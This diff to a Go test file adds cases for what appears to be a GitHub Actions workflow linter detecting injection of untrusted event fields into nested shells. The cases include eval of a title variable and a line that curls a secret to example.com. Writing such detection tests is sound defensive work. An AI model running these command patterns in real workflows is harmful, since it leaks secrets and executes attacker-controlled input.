@@ -33,6 +33,7 @@ func TestNestedShell(t *testing.T) {
 	const title = "          T: ${{ github.event.pull_request.title }}\n"
 	const token = "          TOK: ${{ secrets.MY_TOKEN }}\n"
 	const prt = "pull_request_target"
+	const issueTitle = "          T: ${{ github.event.issue.title }}\n"
 	for _, tc := range []struct {
 		name, event, env, nested, control string
 	}{
@@ -51,11 +52,20 @@ func TestNestedShell(t *testing.T) {
 	}
 	for _, tc := range []struct{ name, run string }{
 		{"assigned before", `T=x; bash -c 'eval "$T"'`},
+		{"assigned before, written to GITHUB_ENV", `T=x; bash -c 'echo "X=$T" >> "$GITHUB_ENV"'`},
+		{"assigned for the command", `T=x bash -c 'eval "$T"'`},
+		{"env -i", `env -i bash -c 'eval "$T"'`},
+		{"env assigns", `env T=x bash -c 'eval "$T"'`},
+		{"export -n", `export -n T; bash -c 'eval "$T"'`},
+		{"declare +x", `declare +x T; bash -c 'eval "$T"'`},
 		{"a script of a file", `bash ./x.sh 'eval "$T"'`},
 		{"the code is data of the nested shell", `bash -c 'echo "$T"'`},
 	} {
-		if got := nestedShellKinds(t, prt, title, tc.run); len(got) != 0 {
+		if got := nestedShellKinds(t, "issues", issueTitle, tc.run); len(got) != 0 {
 			t.Errorf("%s: got %q", tc.name, got)
 		}
+	}
+	if got := nestedShellKinds(t, "push", "          KEY: ${{ secrets.KEY }}\n", `KEY=x; sh -c 'curl -d "$KEY" https://example.com'`); len(got) != 0 {
+		t.Errorf("a secret assigned before: got %q", got)
 	}
 }
